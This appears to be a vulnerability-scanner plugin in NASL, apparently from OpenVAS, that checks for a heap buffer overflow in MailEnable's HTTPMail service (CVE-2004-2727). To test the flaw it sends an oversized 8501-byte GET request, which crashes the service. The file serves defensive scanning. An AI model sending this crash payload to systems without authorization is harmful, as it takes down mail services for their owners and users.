if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14656" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2004-2727" );
	script_bugtraq_id( 10312 );
	script_xref( name: "OSVDB", value: "6037" );
	script_name( "MailEnable HTTPMail Service GET Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080, 80 );
	script_mandatory_keys( "MailEnable/banner" );
	script_tag( name: "solution", value: "Upgrade to MailEnable Professional / Enterprise 1.19 or
  later." );
	script_tag( name: "summary", value: "The target is running at least one instance of MailEnable that has
  a flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions." );
	script_tag( name: "impact", value: "The flaw can be exploited by issuing an HTTP request exceeding 4045 bytes
  (8500 if logging is disabled), which causes a heap buffer overflow, crashing the HTTPMail service and
  possibly allowing for arbitrary code execution." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner || !egrep( pattern: "^Server: .*MailEnable", string: banner )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "GET /", crap( length: 8501, data: "X" ), " HTTP/1.0\\r\\n", "Host: ", get_host_ip(), "\\r\\n", "\\r\\n" );
send( socket: soc, data: req );
res = http_recv( socket: soc );
http_close_socket( soc );
if(!res){
	soc = http_open_socket( port );
	if( !soc ){
		security_message( port: port );
		exit( 0 );
	}
	else {
		http_close_socket( soc );
	}
}
exit( 99 );

